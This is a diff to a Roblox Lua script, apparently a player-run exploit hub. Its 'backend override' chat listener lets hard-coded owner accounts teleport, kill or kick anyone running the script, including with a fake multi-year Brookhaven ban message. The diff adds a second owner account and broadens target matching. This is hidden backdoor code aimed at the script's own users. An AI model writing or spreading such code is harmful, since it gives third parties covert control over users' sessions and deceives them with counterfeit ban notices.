@@ -1034,46 +1034,67 @@ end)
 --==================================================
 -- BACKEND OVERRIDE SYSTEM
 --==================================================
-local Owners = {"AGKaBaap_YadsanAsuka"}
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
 
-local function isOwner(s)
-    for _, o in pairs(Owners) do if s == o then return true end end
-    return false
+local plr = Players.LocalPlayer
+local Owners = {"AGKaBaap_YadsanAsuka", "CSXLuffy01"}
+
+local function isOwner(name)
+	for _, ownerName in ipairs(Owners) do
+		if name == ownerName then
+			return true
+		end
+	end
+	return false
+end
+
+local function matchesTarget(player, targetName)
+	local lowerTarget = targetName:lower()
+	return player.Name:lower():sub(1, #lowerTarget) == lowerTarget
+		or player.DisplayName:lower():sub(1, #lowerTarget) == lowerTarget
 end
 
 TextChatService.MessageReceived:Connect(function(textResult)
-    local sender = textResult.TextSource
-    if not sender then return end
+	local sender = textResult.TextSource
+	if not sender then return end
 
-    local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
-    if not senderPlayer or not isOwner(senderPlayer.Name) then return end
+	local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
+	if not senderPlayer or not isOwner(senderPlayer.Name) then return end
 
-    local msg = textResult.Text:lower()
-    local args = msg:split(" ")
-    local cmd = args[1]
-    local targetName = args[2]
+	local rawArgs = textResult.Text:split(" ")
+	local cmd = rawArgs[1] and rawArgs[1]:lower()
+	local targetName = rawArgs[2]
 
-    if cmd == ";bring" and targetName then
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer and targetPlayer.Character and plr.Character then
-            plr.Character:MoveTo(targetPlayer.Character.PrimaryPart.Position)
-        end
-    elseif cmd == ";kill" then
-        if plr.Character then
-            plr.Character:BreakJoints()
-        end
-    elseif cmd == ";kick" and targetName then
-        if plr.Name:lower():sub(1, #targetName) == targetName:lower() then
-            local reason = table.concat(args, " ", 3) or "No reason provided."
-            plr:Kick("\n[ EXC KICK ]\nAdmin: " .. senderPlayer.Name .. "\nReason: " .. reason)
-        end
-    elseif cmd == ";ban" and targetName then
-        if plr.Name:lower():sub(1, #targetName) == targetName:lower() then
-            local reason = (table.concat(args, " ", 3) or "Banned by Catel Gang"):upper()
-            plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Brookhaven\nduration 999999 days!\n\nReason: " .. reason .. "\nAdmin: " .. senderPlayer.Name)
-        end
-    elseif cmd == "!stopall" then
-        if gui then gui:Destroy() end
-        if blur then blur:Destroy() end
-    end
+	if cmd == ";bring" and targetName then
+		if matchesTarget(plr, targetName) and senderPlayer.Character and plr.Character then
+			plr.Character:PivotTo(senderPlayer.Character:GetPivot())
+		end
+
+	elseif cmd == ";kill" then
+		if not targetName or matchesTarget(plr, targetName) then
+			if plr.Character then
+				plr.Character:BreakJoints()
+			end
+		end
+
+	elseif cmd == ";kick" and targetName then
+		if matchesTarget(plr, targetName) then
+			local reason = table.concat(rawArgs, " ", 3)
+			if reason == "" then reason = "No reason provided." end
+			plr:Kick("\n[ EXC KICK ]\nAdmin: " .. senderPlayer.Name .. "\nReason: " .. reason)
+		end
+
+	elseif cmd == ";ban" and targetName then
+		if matchesTarget(plr, targetName) then
+			local reason = table.concat(rawArgs, " ", 3)
+			if reason == "" then reason = "Banned by Catel Gang" end
+			plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Brookhaven\nduration 999999 days!\n\nReason: " .. reason:upper() .. "\nAdmin: " .. senderPlayer.Name)
+		end
+
+	elseif cmd == "!stopall" then
+		if gui then gui:Destroy() end
+		if blur then blur:Destroy() end
+	end
 end)
+
